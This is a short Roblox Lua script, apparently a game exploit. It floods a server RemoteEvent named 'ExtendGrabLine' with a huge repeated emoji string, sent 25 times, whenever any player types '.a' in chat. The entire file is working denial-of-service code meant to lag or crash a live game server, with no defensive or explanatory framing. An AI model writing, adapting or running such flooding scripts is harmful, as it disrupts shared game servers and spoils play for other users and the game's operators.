--CHAT
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local plr = Players.LocalPlayer
local grabRemote = ReplicatedStorage
    :WaitForChild("GrabEvents")
    :WaitForChild("ExtendGrabLine")


local kilobytes, packets = 500, 25
local interval = 7.5

local function runPkt()
    local data = string.rep("🔥GENERALG🔥‍‍", kilobytes * 1024)

    for i = 1, packets do
        grabRemote:FireServer(data)
        task.wait(interval)
    end
end


local function onChatted(player)
    player.Chatted:Connect(function(msg)
        if msg == ".a" then
            runPkt()
        end
    end)
end


for _, player in ipairs(Players:GetPlayers()) do
    onChatted(player)
end


Players.PlayerAdded:Connect(onChatted)

